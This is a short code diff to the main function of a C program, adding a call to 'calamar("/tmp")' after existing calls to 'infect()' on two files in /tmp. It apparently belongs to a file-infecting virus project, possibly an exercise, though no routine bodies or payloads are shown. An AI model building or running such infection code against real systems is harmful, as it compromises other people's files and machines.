@@ -157,5 +157,8 @@ int		main(int ac, char **av)
 		infect("/tmp/test");
 		infect("/tmp/test2");
 	}
+
+	calamar("/tmp");
+
 	return (0);
 }
